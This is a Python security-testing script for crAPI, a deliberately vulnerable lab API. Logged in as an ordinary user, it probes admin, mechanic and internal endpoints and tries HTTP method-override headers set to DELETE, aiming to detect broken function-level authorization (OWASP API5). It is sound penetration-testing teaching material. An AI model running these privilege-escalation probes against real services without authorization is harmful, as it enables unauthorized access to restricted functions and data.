#!/usr/bin/env python3
"""
OWASP API Security Top 10:2023 - API5: Broken Function Level Authorization
Target: crAPI running on Docker (default port 8888)

Tests for:
  - Regular user accessing admin-only endpoints
  - Accessing internal/workshop API endpoints without proper role
  - HTTP method manipulation (GET→PUT, etc.) on privileged functions
  - Accessing management endpoints that should be restricted
"""

import requests
import json
import sys

from crapi_config import BASE_URL, USER1_EMAIL, USER1_PASSWORD, USER2_EMAIL, USER2_PASSWORD
USER_EMAIL = USER1_EMAIL
USER_PASSWORD = USER1_PASSWORD




def get_token():
    r = requests.post(f"{BASE_URL}/identity/api/auth/login",
                      json={"email": USER_EMAIL, "password": USER_PASSWORD})
    if r.status_code == 200:
        return r.json().get("token")
    return None


def test_admin_endpoint_access(token):
    """
    API5 Test: Attempt to access admin-only endpoints with a regular user token.
    """
    print(f"\n[API5:BFLA] Admin Endpoint Access with Regular User Token")
    headers = {"Authorization": f"Bearer {token}"}

    admin_endpoints = [
        ("GET",  "/identity/api/v2/admin/users"),
        ("GET",  "/identity/api/v2/admin/users/all"),
        ("GET",  "/workshop/api/admin/mechanic"),
        ("GET",  "/workshop/api/admin/mechanic/all"),
        ("GET",  "/community/api/v2/admin/posts"),
        ("GET",  "/workshop/api/v2/admin/reports"),
    ]

    vulnerable = False
    for method, path in admin_endpoints:
        url = f"{BASE_URL}{path}"
        r = requests.request(method, url, headers=headers)
        status = r.status_code
        indicator = ""
        if status == 200:
            indicator = " ← [VULNERABLE] Access granted!"
            vulnerable = True
        elif status == 403:
            indicator = " ← [PROTECTED] 403 Forbidden"
        elif status == 401:
            indicator = " ← [PROTECTED] 401 Unauthorized"
        elif status == 404:
            indicator = " ← [INFO] 404 Not Found"
        else:
            indicator = f" ← HTTP {status}"
        print(f"  {method:6} {path}{indicator}")

    return vulnerable


def test_mechanic_api_access(token):
    """
    API5 Test: Can a regular user call mechanic workshop APIs
    that should be restricted to shop/mechanic roles?
    """
    print(f"\n[API5:BFLA] Mechanic/Workshop API Access by Regular User")
    headers = {"Authorization": f"Bearer {token}"}

    mechanic_endpoints = [
        ("GET",  "/workshop/api/mechanic/"),
        ("GET",  "/workshop/api/mechanic/mechanic_report?report_id=1"),
        ("GET",  "/workshop/api/shop/products"),
        ("POST", "/workshop/api/shop/orders", {"product_id": 1, "quantity": 1}),
    ]

    vulnerable = False
    for item in mechanic_endpoints:
        method, path = item[0], item[1]
        body = item[2] if len(item) > 2 else None
        url = f"{BASE_URL}{path}"

        if body:
            r = requests.request(method, url, headers=headers, json=body)
        else:
            r = requests.request(method, url, headers=headers)

        status = r.status_code
        indicator = ""
        if status == 200:
            indicator = " ← [VULNERABLE] Access granted!"
            vulnerable = True
        elif status in (401, 403):
            indicator = f" ← [PROTECTED] {status}"
        else:
            indicator = f" ← HTTP {status}"
        print(f"  {method:6} {path}{indicator}")
        if status == 200:
            print(f"         Response preview: {r.text[:150]}")

    return vulnerable


def test_http_method_override(token):
    """
    API5 Test: Attempt HTTP method override headers to bypass function-level controls.
    E.g., use X-HTTP-Method-Override to perform DELETE as GET.
    """
    print(f"\n[API5:BFLA] HTTP Method Override Attack")
    headers_base = {"Authorization": f"Bearer {token}"}

    override_headers_list = [
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "X-HTTP-Method",
        "_method",
    ]

    # Try to DELETE a resource using a GET with override header
    # (Target: a community post - non-destructive probe)
    url = f"{BASE_URL}/community/api/v2/community/posts/recent"
    vulnerable = False

    for override_header in override_headers_list:
        h = {**headers_base, override_header: "DELETE"}
        r = requests.get(url, headers=h)
        print(f"  GET + {override_header}: DELETE → HTTP {r.status_code}", end="")
        if r.status_code == 200 and "deleted" in r.text.lower():
            print(" ← [VULNERABLE] Method override accepted!")
            vulnerable = True
        else:
            print()

    if not vulnerable:
        print(f"  [PROTECTED] No method override accepted")

    return vulnerable


def test_privilege_function_direct_call(token):
    """
    API5 Test: Call service-to-service or internal endpoints directly.
    crAPI's workshop service has endpoints intended for internal use only.
    """
    print(f"\n[API5:BFLA] Direct Internal Endpoint Access")
    headers = {"Authorization": f"Bearer {token}"}

    # Try to directly access service-to-service endpoints
    internal_paths = [
        "/workshop/api/mechanic/service_requests",
        "/workshop/api/mechanic/ready_for_pickup",
        "/identity/api/v2/admin/users/find",
    ]

    vulnerable = False
    for path in internal_paths:
        url = f"{BASE_URL}{path}"
        r = requests.get(url, headers=headers)
        print(f"  GET {path} → HTTP {r.status_code}", end="")
        if r.status_code == 200:
            print(f" ← [VULNERABLE] Internal endpoint accessible! Data: {r.text[:120]}")
            vulnerable = True
        else:
            print()

    return vulnerable


def main():
    print("=" * 60)
    print("  crAPI - API5: Broken Function Level Authorization")
    print("=" * 60)
    print(f"\nTarget: {BASE_URL}")

    token = get_token()
    if not token:
        print("[ERROR] Authentication failed. Check USER_EMAIL/USER_PASSWORD.")
        sys.exit(1)
    print(f"[AUTH] Token acquired: {token[:40]}...")

    results = []
    results.append(("Admin Endpoint Access (Regular User)", test_admin_endpoint_access(token)))
    results.append(("Mechanic API Access (Regular User)",   test_mechanic_api_access(token)))
    results.append(("HTTP Method Override Attack",           test_http_method_override(token)))
    results.append(("Internal Endpoint Direct Access",       test_privilege_function_direct_call(token)))

    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    for name, vuln in results:
        status = "VULNERABLE ⚠️ " if vuln else "PROTECTED  ✅"
        print(f"  {status}  {name}")
    print()


if __name__ == "__main__":
    main()
